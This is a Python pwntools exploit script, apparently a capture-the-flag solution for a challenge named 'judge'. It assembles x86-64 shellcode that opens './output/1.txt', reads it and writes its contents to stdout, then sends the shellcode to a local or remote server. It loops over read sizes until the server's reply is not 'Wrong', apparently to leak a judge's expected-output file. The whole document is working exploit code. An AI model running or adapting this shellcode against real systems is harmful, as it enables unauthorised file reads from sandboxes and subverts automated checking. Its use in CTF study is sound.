#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('judge')
context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug(["python3","server.py"], gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process(["python3","server.py"], *a, **kw)

gdbscript = '''
init-gef
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve(size):

    filename = "./output/1.txt"

    sc = asm(
        f"""
        open:
            mov rax, 2
            lea rdi, [rip+filename]
            xor esi, esi
            xor edx, edx
            syscall
        
        use_mmap_region:
            lea r8, [rip]
            add r8, 0x200
        
        read:
            mov rdi, rax
            mov rsi, r8
            mov rdx, {size}
            xor eax, eax
            syscall

        write:
            mov rax, 1
            mov rdi, 1
            mov rsi, r8
            mov rdx, {size}
            syscall

        exit:
            mov rax, 0x3c
            xor edi, edi
            syscall

        filename:
            .asciz "{filename}"
 
        """
    )

    io.sendlineafter(b">", sc.hex())
    data = io.recvline()
    if b"Wrong" not in data:
        print(data)
        io.interactive()

    io.close()

def main():
    
    for size in range(0x100):
        init()
        solve(size)
        

if __name__ == '__main__':
    main()

